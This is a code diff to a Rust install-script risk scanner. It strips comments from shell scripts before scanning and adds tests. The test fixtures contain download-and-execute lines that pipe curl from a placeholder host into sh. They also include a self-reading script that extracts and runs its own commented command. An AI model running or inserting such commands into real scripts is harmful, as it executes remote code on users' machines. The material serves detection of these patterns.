@@ -3456,8 +3456,20 @@ pub fn install_script_risk(p: &Pack, text: &[u32], lang: Option<&str>) -> Vec<Py
 /// core.install_script_risk(text, shell, command, lang): `shell`, read a
 /// shell script with the shell reader; `command`, the text is a hook's
 /// command; `lang`, the script's language when known ("js", "py": its
-/// strings are read as its runtime reads them).
+/// strings are read as its runtime reads them). A shell script is read
+/// without its comments, which no shell runs, unless it reads its own file
+/// (SH-COMMENT-FP, 0.1.9: `shell::script_without_comments`).
 pub fn install_script_risk_with(p: &Pack, text: &[u32], shell: bool, command: bool, lang: Option<&str>) -> Vec<PyStr> {
+    if shell && !command {
+        if let Some(bare) = crate::shell::script_without_comments(p, text, lang) {
+            let _gate = crate::textgate::open(&bare);
+            return install_script_risk_text(p, &bare, shell, command, lang);
+        }
+    }
+    install_script_risk_text(p, text, shell, command, lang)
+}
+
+fn install_script_risk_text(p: &Pack, text: &[u32], shell: bool, command: bool, lang: Option<&str>) -> Vec<PyStr> {
     let mut reasons = install_script_risk_of(p, text, shell, command, lang, None);
     for (_, r) in rewrite_reasons(p, text, lang) {
         push_new(&mut reasons, r);
@@ -4839,5 +4851,34 @@ mod rewrite_tests {
             assert_eq!(strs(&import_time_risk_with(&p, &text, Some("js"), None).0), vec![reason.clone()]);
         }
         assert_eq!(strs(&import_time_risk_with(&p, &text, Some("js"), None).0), vec![reason]);
+    }
+}
+
+#[cfg(test)]
+mod comment_tests {
+    use super::*;
+    use crate::pack;
+
+    fn risk(text: &str, lang: Option<&str>) -> Vec<String> {
+        let p = pack::current();
+        install_script_risk(&p, &pystr::u(text), lang).iter().map(|x| pystr::to_string(x)).collect()
+    }
+
+    #[test]
+    fn a_shell_scripts_comments_are_not_its_commands() {
+        // SH-COMMENT-FP: agent-sanitizer's session-setup.sh, CRITICAL for the bootstrap its comment says it replaced
+        let pipe = "pipes a download into a shell".to_string();
+        let script = "#!/bin/bash\n# This replaced a `curl https://x.invalid/i | sh` bootstrap.\nDIR=\"$(dirname \"$0\")\"\nbash \"$DIR/install.sh\"\n";
+        assert_eq!(risk(script, None), Vec::<String>::new());
+        assert_eq!(risk(&script.replace("bash \"$DIR", "curl -s https://x.invalid/i | sh # \"$DIR"), None), vec![pipe.clone()]);
+        // a #! line that names a shell, whatever the file's name; without one, a file the caller gives no language
+        assert_eq!(risk(script, Some("js")), Vec::<String>::new());
+        assert_eq!(risk(&script.replacen("#!/bin/bash\n", "", 1), None), Vec::<String>::new());
+        assert_eq!(risk(&script.replacen("#!/bin/bash\n", "", 1), Some("js")), vec![pipe.clone()]);
+        // a script that reads its own file: its comments may be what it runs
+        let own = "#!/bin/sh\n#X curl -s https://x.invalid/i | sh\ngrep '^#X' \"$0\" | cut -c4- | sh\n";
+        assert_eq!(risk(own, None), vec![pipe.clone()]);
+        // a here-document's body is not a comment
+        assert_eq!(risk("#!/bin/sh\n# setup\nsh <<'EOF'\n# curl -s https://x.invalid/i | sh\nEOF\n", None), vec![pipe]);
     }
 }
